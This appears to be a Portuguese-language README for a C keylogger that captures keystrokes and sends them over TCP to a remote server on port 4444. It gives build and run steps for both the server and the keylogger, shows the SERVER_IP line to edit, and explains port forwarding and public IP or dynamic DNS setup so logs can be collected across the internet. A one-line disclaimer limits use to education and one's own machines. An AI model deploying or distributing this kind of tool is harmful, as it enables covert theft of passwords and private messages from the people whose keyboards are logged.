# Keylogger com Envio Remoto

Este projeto implementa um keylogger simples em C que captura as teclas digitadas e as envia para um servidor remoto via TCP.

## 🚀 Como Usar

### 📡 1️⃣ Configurar o Servidor (Recebe os Logs)
1. No computador que **receberá os logs**, compile e execute o servidor:

```bash
gcc server.c -o server.exe -lws2_32
server.exe
```

2. O servidor ficará escutando conexões na porta `4444` e salvará os logs recebidos em `log_remoto.txt`.

### 💻 2️⃣ Configurar o Keylogger (Envia os Logs)
1. No **computador onde será capturado o teclado**, altere o IP do servidor no código-fonte:
   ```c
   #define SERVER_IP "192.168.1.100"  // 🛑 Substitua pelo IP do servidor
   ```
2. Compile e execute o keylogger:
   ```bash
   gcc keyLogger.c -o keyLogger.exe -lws2_32
   keyLogger.exe
   ```

### 📍 Como Descobrir o IP do Servidor?
No computador que rodará o servidor, abra o **Prompt de Comando (CMD)** e digite:
```cmd
ipconfig
```

🔹 Pegue o **Endereço IPv4** e substitua no código do keylogger.

### 🌐 Rodando na Internet
Se quiser rodar em redes externas, você precisa:
- Configurar **port forwarding** no roteador para liberar a porta `4444`.
- Usar um **IP público** ou configurar um **DNS dinâmico**.

## ⚠️ Aviso Legal
**Este código deve ser usado apenas para fins educacionais e testes em máquinas próprias.** O uso indevido pode ser ilegal. Use com responsabilidade! 🔥
